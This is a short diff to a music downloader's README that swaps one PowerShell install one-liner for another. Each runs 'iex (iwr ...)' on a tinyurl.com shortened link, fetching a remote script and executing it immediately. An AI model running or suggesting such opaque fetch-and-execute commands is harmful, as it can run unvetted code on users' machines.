@@ -12,7 +12,7 @@ Modern music downloader — Search YouTube, fetch metadata from Deezer/iTunes, a
 4. Press Enter
 
 ```
-iex (iwr -useb https://tinyurl.com/msdlps1)
+iex (iwr -useb https://tinyurl.com/msdl101)
 ```
 
 - ✅ That's all. Your playlist is one command away.
